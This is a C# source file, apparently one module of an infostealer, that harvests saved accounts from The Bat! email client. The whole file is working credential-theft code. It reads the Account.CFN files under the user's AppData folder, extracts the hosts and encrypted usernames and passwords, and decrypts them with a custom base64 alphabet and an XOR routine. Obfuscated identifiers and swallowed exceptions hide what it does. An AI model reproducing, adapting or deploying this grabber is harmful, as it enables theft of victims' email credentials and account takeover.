using System;
using System.Collections.Generic;
using System.IO;
using C6Zy;
using JSW1fecBOy;

namespace rk937aHHc
{
	public class The_Bat : EtbH
	{
		public The_Bat()
		{
			this.xBH = "The Bat!";
		}

		public string xBH { get; set; }

	public List<WTitxI2m> Grab()
	{
		List<WTitxI2m> list = new List<WTitxI2m>();

		string path = Environment.GetEnvironmentVariable("appdata") + "\\The Bat!";

		if (!Directory.Exists(path))
			return list;

		try
		{
			string[] directories = Directory.GetDirectories(path);

			foreach (string dir in directories)
			{
				string accountFile = Path.Combine(dir, "Account.CFN");
				if (!File.Exists(accountFile))
					continue;

				string[] lines = File.ReadAllLines(accountFile);

				foreach (string line in lines)
				{
					if (!line.Contains("zzz"))
						continue;

					try
					{
						string[] parts = line.o1a9sIqIfKj(new string(new char[3]));

						string encryptedPassword = parts[2].Split(new char[1])[0];
						string encryptedUsername = parts[2].Split(new char[1])[1];

						string hostRaw = parts[0].Trim(new char[1]);

						string[] hostSplit = parts[0].o1a9sIqIfKj(
							"=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
						);

						string host = hostSplit.Length > 1 ? hostSplit[1] : hostRaw;

						if (encryptedPassword.Length > 0 && encryptedUsername.Length > 0)
						{
							list.Add(new WTitxI2m
							{
								data1 = host,
								data2 = The_Bat.G8H7O5Sx(encryptedUsername),
								data3 = The_Bat.G8H7O5Sx(encryptedPassword),
								data4 = this.xBH
							});
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}

		return list;
	}

	private static string G8H7O5Sx(string input)
	{
		if (input.Length % 4 != 0)
			return "";

		const string table = "+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

		byte[] buffer = new byte[1024];
		int bufferIndex = 0;
		int inputIndex = 0;

		while (inputIndex < input.Length)
		{
			int value = 0;
			int count = 0;

			while (count <= 3)
			{
				if (inputIndex >= input.Length)
					break;

				char c = input[inputIndex++];
				int idx = table.IndexOf(c);

				if (idx < 0)
					return "";

				value = (value << 6) + idx;
				count++;
			}

			if (count > 3)
			{
				buffer[bufferIndex++] = (byte)((value >> 16) & 0xFF);
				buffer[bufferIndex++] = (byte)((value >> 8) & 0xFF);
				buffer[bufferIndex++] = (byte)(value & 0xFF);
			}
		}

		byte[] trimmed = Q2e(buffer);

		// 뒤에서부터 XOR 0x5A
		string result = "";
		for (int i = trimmed.Length - 1; i > 4; i--)
		{
			result += (char)(trimmed[i] ^ 0x5A);
		}

		return result;
	}

	private static byte[] Q2e(byte[] data)
	{
		if (data.Length <= 1)
			return new byte[0];

		int lastIndex = data.Length - 1;

		// 뒤쪽 NULL 제거
		while (lastIndex >= 0 && data[lastIndex] == 0)
		{
			lastIndex--;
		}

		if (lastIndex < 0)
			return new byte[0];

		byte[] result = new byte[lastIndex + 1];

		for (int i = 0; i <= lastIndex; i++)
		{
			result[i] = data[i];
		}

		return result;
	}
}
